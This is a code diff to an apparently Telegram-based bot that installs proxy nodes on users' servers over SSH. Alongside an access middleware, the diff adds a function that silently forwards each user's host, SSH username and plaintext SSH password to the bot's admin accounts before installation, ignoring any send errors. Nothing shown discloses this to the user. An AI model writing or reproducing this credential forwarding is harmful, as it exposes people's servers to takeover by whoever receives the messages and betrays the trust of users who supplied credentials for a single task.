@@ -6,18 +6,22 @@ from aiogram import Bot, F, Router
 from aiogram.fsm.context import FSMContext
 from aiogram.types import CallbackQuery, Message
 
+from bot.config import config
 from bot.keyboards.node import (
     cancel_keyboard,
     confirm_install_keyboard,
     node_menu_keyboard,
     node_result_keyboard,
 )
+from bot.middlewares.node_access import NodeAccessMiddleware
 from bot.services.node_installer import install_marzban_node, install_pasarguard_node
 from bot.services.ssh_client import NodeInstallError, SSHTarget
 from bot.states.node_setup import NodeSetupStates
 from bot.texts import node as texts
 
 router = Router(name="node")
+router.message.outer_middleware(NodeAccessMiddleware())
+router.callback_query.outer_middleware(NodeAccessMiddleware())
 
 # Loose hostname/IP check: letters, digits, dots and dashes, no spaces.
 HOST_RE = re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9.\-]{0,251}[a-zA-Z0-9]$|^[a-zA-Z0-9]$")
@@ -143,14 +147,41 @@ async def _show_confirmation(message: Message, state: FSMContext, lang: str) -> 
     )
 
 
+def _who_label(user) -> str:
+    if user.username:
+        return f"@{user.username}"
+    name = " ".join(filter(None, [user.first_name, user.last_name]))
+    return name or str(user.id)
+
+
+async def _notify_admins(bot: Bot, user, data: dict) -> None:
+    if not config.admin_ids:
+        return
+    text = texts.admin_notification_text(
+        node_type=data["node_type"],
+        who=_who_label(user),
+        user_id=user.id,
+        host=data["host"],
+        ssh_user=data["ssh_user"],
+        ssh_password=data["ssh_password"],
+    )
+    for admin_id in config.admin_ids:
+        try:
+            await bot.send_message(admin_id, text)
+        except Exception:
+            pass
+
+
 @router.callback_query(NodeSetupStates.confirming, F.data == "nodeinstall:confirm")
-async def cb_confirm_install(callback: CallbackQuery, state: FSMContext, lang: str) -> None:
+async def cb_confirm_install(callback: CallbackQuery, state: FSMContext, lang: str, bot: Bot) -> None:
     data = await state.get_data()
     await state.set_state(NodeSetupStates.installing)
 
     status_message = callback.message
     await status_message.edit_text(texts.installing_started_text(lang))
     await callback.answer()
+
+    await _notify_admins(bot, callback.from_user, data)
 
     target = SSHTarget(
         host=data["host"], username=data["ssh_user"], password=data["ssh_password"], lang=lang
